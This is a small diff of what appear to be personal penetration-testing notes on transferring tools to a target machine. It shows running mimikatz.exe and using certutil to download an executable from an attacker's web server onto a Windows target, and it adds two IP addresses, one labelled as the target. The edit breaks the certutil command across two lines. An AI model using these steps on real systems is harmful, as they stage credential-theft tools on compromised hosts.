@@ -25,8 +25,11 @@ transfer file to target system in `tmp` directory
 - ./mimikatz.exe is to execute the file
 
 Downloading without python http-server
-- in a command shell, download file: `certutil -urlcache -f http://adres_webserver_ip/filename_downloading.exe file_savingname.exe`
+- in a command shell, download file: `certutil -urlcache -f http://adres_webserver
+- _ip/filename_downloading.exe file_savingname.exe`
 
+10.2.26.89 target 
+10.10.11.2
 
 ##### Transfer to linux targets 
 
